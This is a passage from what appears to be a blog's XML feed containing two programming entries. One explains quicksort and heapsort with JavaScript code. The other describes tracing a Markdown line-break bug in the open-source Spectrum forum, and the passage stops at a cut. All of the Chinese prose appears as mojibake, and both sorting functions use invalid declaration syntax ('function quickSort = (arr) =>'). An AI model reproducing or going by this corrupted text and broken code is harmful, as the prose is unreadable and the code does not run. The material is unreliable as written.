æˆ‘å€‘æŒ‘é¸ 14 ç•¶ä½œ pivotï¼Œèª¿æ•´éå¾Œè®Šæˆï¼š7, 6, 9 , 10, 14, 20, 15ï¼Œå·¦é‚Šéƒ½æ¯”å®ƒå°ï¼Œå³é‚Šéƒ½æ¯”å®ƒå¤§ã€‚
è€Œç•¶ä½ æŠŠ 14 èª¿æ•´å¥½çš„æ™‚å€™ï¼Œå…¶å¯¦é€™å€‹å…ƒç´ å°±æ’å¥½äº†ï¼å› ç‚ºå·¦é‚Šæ¯”å®ƒå°ï¼Œå³é‚Šæ¯”å®ƒå¤§å˜›ï¼Œæ‰€ä»¥é€™ä¸€å€‹æ•¸å­—å°±æ’å¥½äº†ã€‚æ¥è‘—åªè¦å°å·¦å³å…©é‚Šé‚„æ²’æ’å¥½çš„ä¹Ÿåšå¿«é€Ÿæ’åºå°±è¡Œäº†ã€‚
è€Œå¿«é€Ÿæ’åºçš„æ ¸å¿ƒåœ¨æ–¼ä½ è¦æ€éº¼æ‰¾åˆ°é‚£å€‹æ•¸ï¼Œå¦‚æœä½ æ‰¾çš„æ•¸å­—å‰›å¥½æ˜¯æ•¸åˆ—çš„ä¸­ä½æ•¸ï¼Œé‚£ç•¶ç„¶æ•ˆç‡æœ€é«˜ã€‚å¦‚æœæ‰¾çš„æ˜¯æœ€å°çš„æ•¸ï¼Œé‚£å°±æ˜¯æœ€å£çš„æƒ…å½¢ï¼Œæ™‚é–“è¤‡é›œåº¦å°±è®ŠæˆO(n^2)ï¼Œæœ‰åˆ†å‰²è·Ÿæ²’åˆ†å‰²ä¸€æ¨£ã€‚
æˆ‘å€‘ç›´æ¥å‡è¨­ç¬¬ä¸€å€‹æ•¸å°±æ˜¯ pivotï¼Œé€™æ¨£æ¯”è¼ƒæ–¹ä¾¿ã€‚
é‚£å†ä¾†æœ‰ä¸€å€‹å•é¡Œæ˜¯ï¼Œè¦æ€éº¼æŠŠé€™å€‹æ•¸å­—èª¿æ•´åˆ°å·¦é‚Šæ¯”å®ƒå°ï¼Œå³é‚Šæ¯”å®ƒå¤§å‘¢ï¼Ÿæˆ‘å€‘å¯ä»¥ç¶­è­·ä¸€å€‹è®Šæ•¸å«åš splitIndexï¼Œè®“é€™å€‹ index å·¦é‚Šçš„å…ƒç´ éƒ½æ¯” pivot å°ï¼Œè€Œé€™å€‹ index æœ¬èº«ä»¥åŠå®ƒå³é‚Šçš„å…ƒç´ éƒ½æ¯” pivot å¤§ã€‚
ç•¶ä½ æƒä¸€éé™£åˆ—ï¼Œç™¼ç¾æŸå€‹å…ƒç´ æ¯” pivot å°çš„æ™‚å€™ï¼Œå°±æŠŠé€™å€‹å…ƒç´ è·Ÿ splitIndex ä¸Šçš„å…ƒç´ äº¤æ›ï¼Œä¸¦ä¸”æŠŠ splitIndex + 1ï¼Œå°±å¯ä»¥åšåˆ°æˆ‘å€‘ä¸Šé¢æƒ³åšçš„äº‹æƒ…äº†ã€‚æœ€å¾Œè¨˜å¾—æŠŠ pivot è·Ÿ splitIndex - 1ï¼ˆä¹Ÿå°±æ˜¯æœ€å¾Œä¸€å€‹æ¯”å®ƒå°çš„å…ƒç´ ï¼‰äº¤æ›ï¼Œå°±èƒ½å¤ æŠŠ pivot æ”¾åˆ°æ­£ç¢ºçš„ä½ç½®ä¸Šäº†ã€‚
å¯ä»¥åƒè€ƒä¸‹é¢çš„ gifï¼Œæˆ–æ˜¯ç›´æ¥å»VISUALGOçœ‹çœ‹ã€‚
ï¼ˆä¾†æºï¼šhttps://github.com/hustcc/JS-Sorting-Algorithm/blob/master/6.quickSort.md ï¼‰
function quickSort = (arr) =&gt; &#123;  const swap = (array, i , j) =&gt; &#123;    [array[i], array[j]] = [array[j], array[i]];  &#125;  const partition = (array, start, end) =&gt; &#123;    let splitIndex = start + 1;    for (let i = start + 1; i &lt;= end; i++) &#123;      if (array[i] &lt; array[start]) &#123;        swap(array, i, splitIndex);        splitIndex++;      &#125;    &#125;      // è¨˜å¾—æŠŠ pivot è·Ÿæœ€å¾Œä¸€å€‹æ¯”å®ƒå°çš„å…ƒç´ äº’æ›    swap(array, start, splitIndex - 1);    return splitIndex - 1;  &#125;  const _quickSort = (array, start, end) =&gt; &#123;    if (start &gt;= end) return array;      // åœ¨ partition è£¡é¢èª¿æ•´æ•¸åˆ—ï¼Œä¸¦ä¸”å›å‚³ pivot çš„ index    const middle = partition(array, start, end);    _quickSort(array, start, middle - 1);    _quickSort(array, middle + 1, end);    return array;  &#125;;  return _quickSort(arr, 0, arr.length - 1);&#125;

å †æ’åºï¼ˆHeap Sortï¼‰Heap æ˜¯ä¸€ç¨®è³‡æ–™çµæ§‹ï¼Œä¸¦ä¸”æœ‰åˆ†å…©ç¨®ï¼šmax heap è·Ÿ min heapï¼Œå…©ç¨®çš„åŸç†å…¶å¯¦é›·åŒï¼Œæˆ‘å€‘ç›´æ¥æ‹¿ max heap ä¾†è¬›ã€‚
å…ˆè®“å¤§å®¶çœ‹ä¸€å¼µ max heap çš„åœ–ç‰‡ï¼š
ï¼ˆè³‡æ–™ä¾†æºï¼šhttps://www.tutorialspoint.com/data_structures_algorithms/heap_data_structure.htm ï¼‰
å¤§å®¶å¯ä»¥ç™¼ç¾ï¼Œmax heap æ»¿è¶³äº†å…©å€‹æ€§è³ªï¼š

çˆ¶ç¯€é»ä¸€å®šå¤§æ–¼å­ç¯€é»
æ•´å€‹æ¨¹çš„æ ¹ç¯€é»ä¸€å®šæ˜¯æœ€å¤§å€¼ï¼ˆå¯ä»¥ç”± 1 æ¨å‡ºä¾†ï¼‰

è€Œè¦ç”¨é™£åˆ—è¡¨ç¤º heap ä¹Ÿå¾ˆç°¡å–®ï¼Œæœƒåƒé€™æ¨£ï¼š
ï¼ˆè³‡æ–™ä¾†æºï¼šhttp://notepad.yehyeh.net/Content/Algorithm/Sort/Heap/Heap.php ï¼‰
æ‰€ä»¥ heap sort å°±æ˜¯åˆ©ç”¨é€™å€‹è³‡æ–™çµæ§‹åšæ’åºï¼Œæµç¨‹å¾ˆç°¡å–®ï¼š

å…ˆæŠŠè®€é€²ä¾†çš„é™£åˆ—å»ºæˆ max heapï¼ˆé€™æ™‚å€™ arr[0] ä¸€å®šæ˜¯é€™é™£åˆ—æœ€å¤§å€¼ï¼‰
æŠŠ arr[0] è·Ÿæœ€å¾Œä¸€å€‹ç¯€é»äº’æ›ï¼ˆå…¶å¯¦æ˜¯æœ€å¾Œä¸€å€‹é‚„æ²’æ’åºéçš„ç¯€é»ï¼‰
èª¿æ•´æˆ max heapï¼Œå›åˆ°æ­¥é©Ÿ 2

heap sort å…¶å¯¦æœ‰é»è¤‡é›œï¼Œè¤‡é›œåˆ°å¯ä»¥å†ç¨ç«‹å‡ºä¾†ä¸€ç¯‡äº†â€¦
ä½†ç°¡å–®ä¾†èªªå‘¢ï¼Œå°±æ˜¯æ”¹è‰¯ç‰ˆçš„é¸æ“‡æ’åºæ³•ï¼Œæ¯ä¸€æ¬¡éƒ½é¸æœ€å¤§å€¼å‡ºä¾†ï¼Œç„¶å¾ŒæŠŠå‰©ä¸‹çš„æ•¸å­—å†èª¿æ•´æˆ max heapã€‚
function heapSort = (arr) =&gt; &#123;    function heapify(arr, length, node) &#123;    const left = node * 2 + 1;    const right = node * 2 + 2;      // å…ˆé è¨­æœ€å¤§çš„ç¯€é»æ˜¯è‡ªå·±    let max = node;      if (left &lt; length &amp;&amp; arr[left] &gt; arr[max]) &#123;      max = left;    &#125;      if (right &lt; length &amp;&amp; arr[right] &gt; arr[max]) &#123;      max = right;    &#125;      // å¦‚æœå·¦å³å…©é‚Šæœ‰ä»»ä½•ä¸€å€‹æ¯” node å¤§çš„è©±    if (max !== node) &#123;      // å°±æŠŠå…©å€‹äº’æ›      [arr[node], arr[max]] = [arr[max], arr[node]];        // æ¥è‘—ç¹¼çºŒ heapfiy      heapify(arr, length, max);    &#125;  &#125;    // build max heap  const length = arr.length;  for (let i = Math.floor(length / 2) - 1; i&gt;=0; i--) &#123;    heapify(arr, length, i);  &#125;    // æ’åº  for (let i = length - 1; i &gt; 0; i--) &#123;    [arr[0], arr[i]] = [arr[i], arr[0]];    heapify(arr, i, 0);  &#125;  return arr;&#125;

ç¸½çµå…¶å¯¦ä»”ç´°ç ”ç©¶éå¾Œï¼Œå°±æœƒç™¼ç¾æ¯ä¸€å€‹æ’åºæ¼”ç®—æ³•éƒ½æœ‰å€¼å¾—åƒè€ƒçš„åœ°æ–¹ï¼Œè€Œä¸”æ¯å€‹æ’åºæ³•éƒ½æ»¿æœ‰è¶£çš„ã€‚ä¹Ÿæœƒç™¼ç¾æ‡‚åŸç†æ˜¯ä¸€å›äº‹ï¼Œå¯«ä¸å¯«çš„å‡ºä¾†åˆæ˜¯å¦å¤–ä¸€å›äº‹äº†ã€‚é€™ç¯‡å°±ç•¶ä½œè‡ªå·±çš„æ’åºæ³•ç­†è¨˜å§ï¼Œå¦‚æœæœ‰ä»»ä½•éŒ¯èª¤éº»ç…©ä¸åæŒ‡å‡ºã€‚
å¦‚æœæƒ³è¦è‡ªå·±ç©ç©çœ‹çš„è©±ï¼Œæˆ‘æœ‰æ”¾åˆ° Github ä¸Šï¼Œæœ‰å¯«å¥½ testcaseï¼Œæ”¹ä¸€æ”¹å°±å¯ä»¥ç›´æ¥æ¸¬äº†ï¼Œæ‡‰è©²æ»¿æ–¹ä¾¿çš„ã€‚
å› ç‚ºè¦æ¸¬è©¦çš„é—œä¿‚ï¼Œæ‰€ä»¥æ¯å€‹æ’åºæ³•å‰é¢éƒ½æœƒåŠ ä¸Šï¼šarr = arr.slice()é¿å…ä¿®æ”¹åˆ°åŸæœ¬çš„ arrayã€‚
æ¸¬è©¦çš„éç¨‹ä¹Ÿæ»¿æœ‰è¶£çš„ï¼Œæˆ‘ç™¼ç¾æœ‰äº› ES6 èªæ³•ï¼ˆä¾‹å¦‚èªªå¾ˆæ½®çš„äº¤æ›èªæ³•æˆ–ç”šè‡³æ˜¯letï¼‰æœ‰æ™‚å€™æœƒæ‹–æ…¢åŸ·è¡Œé€Ÿåº¦ï¼Œå› æ­¤æˆ‘ä¹‹å‰æœ‰æŠŠèªæ³•å…¨éƒ¨æ”¹å› ES5ï¼Œç™¼ç¾æ•ˆç‡å¿«äº†ä¸å°‘ï¼Œä½†é€™ç¯‡å› ç‚ºé‡é»ä¸åœ¨æ•ˆèƒ½ï¼Œæ‰€ä»¥é‚„æ˜¯å…¨éƒ¨ç”¨ ES6 çš„èªæ³•ã€‚
åƒè€ƒè³‡æ–™
[æ¼”ç®—æ³•] å †ç©æ’åºæ³•(Heap Sort)
å¸¸è§æ’åºç®—æ³• - å †æ’åº (Heap Sort)
æ’åºä¹‹å †ç©æ’åºæ³•(Heap Sort)
jsç®—æ³•:heap sort ä½¿ç”¨å †æ’åº
JS-Sorting-Algorithm&#x2F;7.heapSort.md
ç”¨ JavaScript å­¸ç¿’è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•ï¼šæ’åºï¼ˆSortï¼‰èˆ‡æœå°‹ï¼ˆSearchï¼‰ç¯‡

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>sort, algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>è¨˜ä¸€æ¬¡å¹«é–‹æºå°ˆæ¡ˆ spectrum ä¿® bug çš„ç¶“æ­·</title>
    <url>/2019/04/20/spectrum-pull-request/</url>
    <content><![CDATA[å‰è¨€æœ€è¿‘åˆé–‹å§‹äº†è‡ªå·±çš„æ•™å­¸è¨ˆç•«ï¼Œç¬¬ä¸€æœŸçš„æ™‚å€™å¯«äº†é€™ç¯‡ï¼šåˆ©ç”¨ Github Classroom åŠ  Travis CI æ‰“é€ æ”¹ä½œæ¥­ç³»çµ±ï¼Œç¬¬äºŒæœŸå¯«äº†é€™ç¯‡ï¼šAWS Lambda + GitHub API + Google Sheet &#x3D; è‡ªå‹•åŒ–ç°½åˆ°ç³»çµ±ï¼Œéƒ½æ˜¯åˆ©ç”¨ç¾æˆå·¥å…·ä¾†å¿«é€Ÿæ¹Šå‡ºç¬¦åˆè‡ªå·±éœ€æ±‚çš„ç³»çµ±ã€‚
è€Œç¬¬ä¸‰æœŸé–‹å§‹å‰æˆ‘å¸Œæœ›èª²ç¨‹èƒ½æœ‰å€‹è¨è«–å€ï¼Œè®“å­¸ç”Ÿå€‘å¯ä»¥åœ¨ä¸Šé¢å¾ˆæ–¹ä¾¿åœ°å•å•é¡Œã€‚ä¸€ç›´ä»¥ä¾†éƒ½æ˜¯ç”¨ Slackï¼Œä½† Slack æœ€å¤§çš„ç¼ºé»å°±æ˜¯å…è²»ç‰ˆæœƒåƒè¨Šæ¯ï¼Œå¾ˆå¤šä¸éŒ¯çš„è³‡è¨Šè¢«æ´—æ‰å°±è¦ºå¾—æ»¿å¯æƒœçš„ï¼Œå¸Œæœ›èƒ½æœ‰å€‹è«–å£‡æˆ–æ˜¯è¨è«–å€ä¹‹é¡çš„åœ°æ–¹æœƒæ¯”è¼ƒå¥½ã€‚
åœ¨å…©å¹´å‰æˆ‘ä¹Ÿå¯«éä¸€ç¯‡ï¼šè‡ªæ¶è«–å£‡çš„è§£æ±ºæ–¹æ¡ˆï¼šflarum, github issue, nodeBB, discourseï¼Œç ”ç©¶äº†å¹¾å¥—æ–¹æ¡ˆï¼Œæœ€å¾Œé¸æ“‡ GitHub Issueã€‚å› ç‚ºæœ€ç°¡å–®ã€æœ€æ–¹ä¾¿ï¼Œä½†æœ€å¤§çš„ç¼ºé»æ˜¯å­¸ç”Ÿå¥½åƒä¸å¤ªç¿’æ…£ï¼Œå› ç‚ºå·¦çœ‹å³çœ‹ä¸Šçœ‹ä¸‹çœ‹å…¶å¯¦éƒ½ä¸åƒæ˜¯å€‹è«–å£‡ã€‚
å‰é™£å­å› ç·£éš›æœƒä¹‹ä¸‹çŸ¥é“äº†é€™ä¸€å€‹å¹³å°ï¼šspectrumï¼Œé¦–é çš„ slogan å¯«å¾—å¾ˆæ¸…æ¥šï¼š

The community platform for the future.

å»å¹´è¢« GitHub è²·ä¸‹ä¾†ä¹‹å¾Œè®Šæˆå®Œå…¨å…è²»çš„ï¼Œä»¥å‰ä»˜è²»ç‰ˆçš„åŠŸèƒ½ä¹Ÿè®Šå…è²»äº†ã€‚åœ¨æˆ‘çœ‹ä¾†ï¼Œå…¶å¯¦å°±æ˜¯ã€Œæ›´åƒè¨è«–å€ã€çš„ Slackã€‚å…ˆçµ¦å¤§å®¶çœ‹ä¸€å¼µæˆªåœ–ï¼š

æœ€å·¦é‚Šæ˜¯ä¸åŒçš„ workspaceï¼Œé€™è·Ÿ Slack ä¸€æ¨£ã€‚å†ä¾†ä½ å¯ä»¥çœ‹åˆ°å„å€‹ Channlesï¼Œé€™è·Ÿ Slack ä¹Ÿä¸€æ¨£ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯å³é‚Šï¼ŒåŸæœ¬ Slack çš„è¨Šæ¯è®Šæˆäº†ä¸€å€‹å€‹è¨è«–ä¸²ï¼Œæœ‰æ¨™é¡Œè·Ÿå…§æ–‡ã€‚
é€™æ¨£ä½ å¤§æ¦‚å¯ä»¥æ‡‚æˆ‘åœ¨èªªä»€éº¼äº†ï¼Œé€™å¥—è·Ÿ Slack å¾ˆåƒï¼Œä½†æ˜¯æ›´é©åˆç•¶ä½œæ˜¯è¨è«–å€ã€‚
å…è²»ã€èƒŒå¾Œæ˜¯ GitHubã€å¯ä»¥æœ‰ private çš„è«–å£‡ã€é–‹æºï¼Œé€™ç°¡ç›´æ˜¯å®Œç¾çš„è§£æ±ºæ–¹æ¡ˆã€‚é™¤äº†æ²’æœ‰æ‰‹æ©Ÿ App ä»¥å¤–ï¼Œå…¶ä»–æ²’ä»€éº¼å¯ä»¥æŒ‘å‰”çš„ï¼Œå°±æ±ºå®šæ˜¯é€™ä¸€å¥—äº†ï¼
äº‹æƒ…æ²’æœ‰é‚£éº¼é †åˆ©â€¦é–‹å§‹è©¦ç”¨å¹¾å¤©ä¹‹å¾Œï¼Œç™¼ç¾æœ‰ä¸€å€‹è¶…ç´šå¤§å•é¡Œï¼Œé›–ç„¶èªªåœ¨åŠŸèƒ½ä¸Šæ²’ä»€éº¼å•é¡Œï¼Œä½†æ˜¯åœ¨é«”é©—ä¸Šæˆ‘è¦ºå¾—æ¥µå·®ï¼Œé€™ä¸€å€‹å°ç¼ºé»å°±è¶³å¤ è®“æˆ‘æ”¾æ£„é€™å€‹å¹³å°ã€‚
æ˜¯ä»€éº¼å•é¡Œå‘¢ï¼Ÿæ’ç‰ˆã€‚
spectrum åŸç”Ÿæ”¯æ´ Markdownï¼Œä½¿ç”¨èµ·ä¾†ååˆ†é †æ‰‹ï¼Œå¯æ˜¯æ›è¡Œå»å‡ºäº†å•é¡Œã€‚åœ¨æœ‰äº›åœ°æ–¹åªæœ‰ç©ºè¡Œæ˜¯æ²’æœ‰ç”¨çš„ï¼Œçµå°¾è¦åŠ å…©å€‹ç©ºæ ¼æ‰æœƒæ›è¡Œï¼Œé›–ç„¶æˆ‘è¦ºå¾—é€™å¾ˆä¸æ–¹ä¾¿ï¼Œä½†å‹‰å¼·å¯ä»¥æ¥å—ã€‚
å¯æ˜¯ï¼åœ¨ spectrum ä¸Šé¢ï¼Œè¦å…©å€‹æ›è¡Œæ‰æœƒçœŸçš„æ›è¡Œã€‚
åº•ä¸‹æ˜¯ç¯„ä¾‹ï¼Œæœ€ä¸‹é¢çš„ line1 è·Ÿ line2 æ‡‰è©²è¦æ›è¡Œï¼š

å¯æ˜¯ po æ–‡ä¹‹å¾Œå»æœƒè®Šæˆé€™æ¨£ï¼š

æ›è¡Œè®Šæˆäº†ç©ºæ ¼ï¼Œå¦‚æœæ˜¯è‹±æ–‡é‚„å¥½ï¼Œä½†å¦‚æœæ˜¯ä¸­æ–‡çš„è©±æ’ç‰ˆå°±è®Šå¾—è¶…ç´šç„¡æ•µå¥‡æ€ªï¼Œå®Œå…¨ä¸èƒ½æ¥å—ã€‚
å¿ƒç°æ„å†·çš„æˆ‘å»äº†å®˜æ–¹è¨è«–å€ç™¼æ–‡ï¼Œæƒ³èªªæœƒä¸æœƒæœ‰ä»€éº¼å…¶ä»–æ›è¡Œçš„æ–¹æ³•åªæ˜¯æˆ‘ä¸çŸ¥é“ã€‚
çµæœå®˜æ–¹çµ¦æˆ‘çš„å›è¦†æ˜¯ï¼šã€Œå°ï¼Œç¾åœ¨ä½ åªèƒ½æ›è¡Œå…©æ¬¡æ‰æœƒçœŸçš„æ›è¡Œã€ã€‚
åŸæœ¬æ§æœ¨æ­»ç°çš„æˆ‘æƒ³èªªé‚£å°±ä¹¾è„†æ”¾æ£„å§ï¼Œç ”ç©¶çœ‹çœ‹æœ‰æ²’æœ‰å…¶ä»–è§£æ³•ï¼Œç”šè‡³é‚„ä¸€åº¦æƒ³èªªè¦ä¸è¦è‡ªå·±å¯«ä¸€å¥—å‡ºä¾†ï¼Œä½†ä¸€æƒ³åˆ°è¦æ”¯æ´ä¸€å¤§å †åŠŸèƒ½å°±è¦ºå¾—å¾ˆéº»ç…©ï¼Œé²é²ç„¡æ³•ä¸‹å®šæ±ºå¿ƒã€‚
ç¶“éå¹¾å¤©çš„æ·±æ€ä¹‹å¾Œï¼Œè¦ºå¾— spectrum é€™å€‹å¹³å°çœŸçš„å¾ˆå¥½ï¼Œä½†å”¯ä¸€çš„ç¼ºé»å°±æ˜¯æ’ç‰ˆå•é¡Œï¼Œå¦‚æœé€™å€‹ç¼ºé»è§£æ±ºäº†ï¼Œæ²’é“ç†ä¸ç”¨å®ƒã€‚
é¦¬ç‰¹æ‹‰ä¸æ‹‰ï¼Œæˆ‘å€‘è‡ªå·±æ‹‰ã€‚å®˜æ–¹æœ‰ bug æ²’ç©ºä¿®ï¼Œæ²’é—œä¿‚ï¼Œæˆ‘å€‘è‡ªå·±ä¿®ï¼é€™å°±æ˜¯é–‹æºçš„å¥½è™•ã€‚
ä¿® bug ä¹‹æ—…è¦å¹«é–‹æºå°ˆæ¡ˆä¿® bug çš„ç¬¬ä¸€æ­¥å¾ˆç°¡å–®ï¼Œå°±æ˜¯æƒ³è¾¦æ³•æŠŠæ•´å€‹ç’°å¢ƒè·‘èµ·ä¾†ã€‚ä½ è¦æœ‰è¾¦æ³•åœ¨æœ¬æ©Ÿè·‘èµ·ä¾†æ‰æœ‰è¾¦æ³•é©—è­‰è‡ªå·±åˆ°åº•æœ‰æ²’æœ‰ä¿®æˆåŠŸï¼Œæ‰€ä»¥å®˜æ–¹æ–‡ä»¶æ˜¯å¾ˆé‡è¦çš„ã€‚
spectrum çš„æ–‡ä»¶å¾ˆé½Šå…¨ï¼Œæœ‰ä¸€é€£ä¸²çš„æŒ‡ç¤ºå‘Šè¨´ä½ æ‡‰è©²è¦æ€éº¼åšã€‚ç…§è‘—åšä¹‹å¾Œï¼Œå°±èƒ½æŠŠå‰å¾Œç«¯éƒ½åœ¨è‡ªå·±çš„ local è·‘èµ·ä¾†äº†ã€‚
åœ¨ç­‰å¾…å®‰è£é€™äº›å¥—ä»¶çš„é€”ä¸­ï¼Œå¯ä»¥è‡ªå·±ç¨å¾®çŒœä¸€ä¸‹å•é¡Œå‡ºåœ¨å“ªè£¡ã€‚é‚£æ™‚çš„æˆ‘çŒœèªªæ‡‰è©²æ˜¯ markdown çš„ç·¨è¼¯å™¨å‡ºäº†ä»€éº¼å•é¡Œï¼Œå¯èƒ½åœ¨æŠŠ markdown è½‰æˆ HTML çš„æ™‚å€™å‡ºäº†å•é¡Œï¼Œæ²’æœ‰è™•ç†å¥½ï¼Œæ‰€ä»¥å°‘äº†æ›è¡Œã€‚
å…‰çŒœæ˜¯æ²’æœ‰ç”¨çš„ï¼Œç¬¬ä¸€æ­¥è¦ç¸®å°å•é¡Œç¯„åœä¸¦ä¸”å®šä½å•é¡Œï¼Œå…ˆæ‰¾å‡ºæœ€é‡è¦çš„ç™¼æ–‡é€™ä¸€æ®µåˆ°åº•ç™¼ç”Ÿäº†ä»€éº¼äº‹æƒ…ã€‚
åœ¨ Chrome æˆ‘å€‘å¯ä»¥ç”¨ React Devtoolï¼Œçœ‹åˆ°ç™¼æ–‡çš„ä»‹é¢æ˜¯ä¸€å€‹å«åš composer çš„ componentã€‚æ¥è‘—åœ¨ composer&#x2F;index.js è£¡é¢å¯ä»¥çœ‹åˆ°æ˜¯ç”±ä¸€å€‹å«åš Inputs çš„å…ƒä»¶è² è²¬ã€‚
åœ¨ Inputs.js è£¡é¢ç™¼ç¾äº†ä¸€ä»¶é©šäººçš„äº‹æƒ…ï¼ŒåŸä¾†æŒ‰ä¸‹ Preview çš„æ™‚å€™ï¼Œæœƒç›´æ¥é€ request åˆ°ä¸€å€‹å¯«æ­»çš„è·¯å¾‘ä¸¦ä¸”æŠŠçµæœé¡¯ç¤ºå‡ºä¾†ï¼š
const onClick = (show: boolean) =&gt; &#123;  setShowPreview(show);    if (show) &#123;    setPreviewBody(null);    fetch(&#x27;https://convert.spectrum.chat/from&#x27;, &#123;      method: &#x27;POST&#x27;,      body,    &#125;)      .then(res =&gt; &#123;        if (res.status &lt; 200 || res.status &gt;= 300)          throw new Error(&#x27;Oops, something went wrong&#x27;);        return res.json();      &#125;)      .then(json =&gt; &#123;        setPreviewBody(json);      &#125;);  &#125;&#125;;

æ—¢ç„¶è½‰æ›æ˜¯ Server åšçš„ï¼Œé‚£æ¥ä¸‹ä¾†å°±è¦ä¾†æ‰¾æ‰¾ Server åˆ°åº•åšäº†ä»€éº¼ã€‚
å¯æ˜¯æˆ‘åˆä¸çŸ¥é“https://convert.spectrum.chat/fromæ˜¯å°æ‡‰åˆ° Server çš„å“ªè£¡ï¼Œè¦æ€éº¼æ‰¾åˆ° Server æ˜¯æ€éº¼è™•ç†çš„å‘¢ï¼Ÿ
é€™é‚Šå¯ä»¥æ›ä¸€å€‹æƒ³æ³•ï¼Œé›–ç„¶èªªé è¦½çš„æ™‚å€™çš„ç¢ºæ˜¯é€åˆ°é€™é‚Šæ²’éŒ¯ï¼Œä½†æ˜¯ç™¼æ–‡çš„æ™‚å€™ Server ä¸€å®šä¹Ÿæœƒè™•ç†é€™å€‹æ ¼å¼è½‰æ›ï¼Œæ‰€ä»¥å¯ä»¥å…ˆæ‰¾å‡ºç™¼æ–‡çš„æ™‚å€™ Server åˆ°åº•åšäº†ä»€éº¼ï¼Œæ‡‰è©²æœƒæœ‰ä¸€äº›ç·šç´¢ã€‚
æ¥è‘—åœ¨å‰ç«¯ç™¼æ–‡ä¹‹å¾ŒæŸ¥çœ‹ Network tabï¼Œå› ç‚ºå¾Œç«¯æ˜¯ GraphQL æ‰€ä»¥æ»¿å¥½çœ‹çš„ï¼Œæ˜¯ä¸€å€‹å«åšpublushThreadçš„æ“ä½œã€‚
ç«‹åˆ»å¾€ Server çš„éƒ¨åˆ†æ‰¾ï¼Œå¾ªç·šæ‰¾åˆ°äº†é€™å€‹æª”æ¡ˆï¼špublishThread.jsï¼Œä¸¦ä¸”ç™¼ç¾è£¡é¢å‘¼å«äº†ä¸€å€‹ processThreadContent ä¾†åšè½‰æ›ã€‚
å¾€ä¸‹è¿½é€™å€‹ functionï¼Œçœ‹ç¨‹å¼ç¢¼ä¹‹å¾Œç™¼ç¾é€™æ‡‰è©²æ˜¯æœ€åº•å±¤äº†ï¼š
// @flowimport &#123; stateFromMarkdown &#125; from &#x27;draft-js-import-markdown&#x27;;import &#123; convertFromRaw, convertToRaw, EditorState &#125; from &#x27;draft-js&#x27;;import &#123; addEmbedsToEditorState &#125; from &#x27;./add-embeds-to-draft-js&#x27;;  export default (type: &#x27;TEXT&#x27; | &#x27;DRAFTJS&#x27;, body: ?string): string =&gt; &#123;  let newBody = body;  if (type === &#x27;TEXT&#x27;) &#123;    // workaround react-mentions bug by replacing @[username] with @username    // @see withspectrum/spectrum#4587    newBody = newBody ? newBody.replace(/@\[([a-z0-9_-]+)\]/g, &#x27;@$1&#x27;) : &#x27;&#x27;;    newBody = JSON.stringify(      convertToRaw(        stateFromMarkdown(newBody, &#123;          customBlockFn: elem =&gt; &#123;            if (elem.nodeName !== &#x27;PRE&#x27;) return;              const code = elem.childNodes.find(node =&gt; node.nodeName === &#x27;CODE&#x27;);            if (!code) return;              const className = code.attributes.find(              (&#123; name &#125;) =&gt; name === &#x27;class&#x27;            );            if (!className) return;              const lang = className.value.replace(&#x27;lang-&#x27;, &#x27;&#x27;);              return &#123;              type: null,              data: &#123;                language: lang,              &#125;,            &#125;;          &#125;,          parserOptions: &#123;            atomicImages: true,            breaks: true,          &#125;,        &#125;)      )    );  &#125;    // Add automatic embeds to body  try &#123;    return JSON.stringify(addEmbedsToEditorState(JSON.parse(newBody || &#x27;&#x27;)));    // Ignore errors during automatic embed detection  &#125; catch (err) &#123;    console.error(err);    return newBody || &#x27;&#x27;;  &#125;&#125;;

è€Œä¸”æ²’æœ‰çœ‹å‡ºä»»ä½•è·¡è±¡ï¼Œçœ‹èµ·ä¾†ä¸€åˆ‡æ­£å¸¸ã€‚æ­¤æ™‚çš„æˆ‘æƒ³èªªï¼šè©²ä¸æœƒè¦å¾€ä¸‹è¿½åˆ° draft-js æˆ–æ˜¯å…¶ä»–çš„ library å§ï¼Ÿ
ä½†æ˜¯æ—¢ç„¶éƒ½æ‰¾åˆ°é€™äº†ï¼Œæ‡‰è©²å…ˆä¾†çœ‹ä¸€ä¸‹å®ƒè½‰å‡ºä¾†æœƒæ˜¯ä»€éº¼æ±è¥¿ï¼Œå†æ±ºå®šä¸‹ä¸€æ­¥è©²æ€éº¼è¾¦ï¼Œæ–¼æ˜¯æˆ‘åœ¨é€™å€‹ function åŠ äº† logï¼ŒæŠŠå®ƒæœ€å¾Œè½‰æ›çš„æ±è¥¿å°å‡ºä¾†ã€‚
æˆ‘çš„è¼¸å…¥æ˜¯ï¼š
onelinenewline  thirdline  fourline  fiveline

è¼¸å‡ºæ˜¯ï¼š
&#123;  &quot;blocks&quot;:[    &#123;      &quot;key&quot;:&quot;bq56i&quot;,      &quot;text&quot;:&quot;oneline\nnewline\nthirdline&quot;,      &quot;type&quot;:&quot;unstyled&quot;,      &quot;depth&quot;:0,      &quot;inlineStyleRanges&quot;:[],      &quot;entityRanges&quot;:[],      &quot;data&quot;:&#123;&#125;    &#125;,    &#123;      &quot;key&quot;:&quot;9h38b&quot;,      &quot;text&quot;:&quot;fourline&quot;,      &quot;type&quot;:&quot;unstyled&quot;,      &quot;depth&quot;:0,      &quot;inlineStyleRanges&quot;:[],      &quot;entityRanges&quot;:[],      &quot;data&quot;:&#123;&#125;    &#125;,    &#123;      &quot;key&quot;:&quot;fuprm&quot;,      &quot;text&quot;:&quot;fiveline&quot;,      &quot;type&quot;:&quot;unstyled&quot;,      &quot;depth&quot;:0,      &quot;inlineStyleRanges&quot;:[],      &quot;entityRanges&quot;:[],      &quot;data&quot;:&#123;&#125;    &#125;  ],  &quot;entityMap&quot;:&#123;&#125;&#125;

ä¸å°å‰‡å·²ï¼Œä¸€å°é©šäººï¼
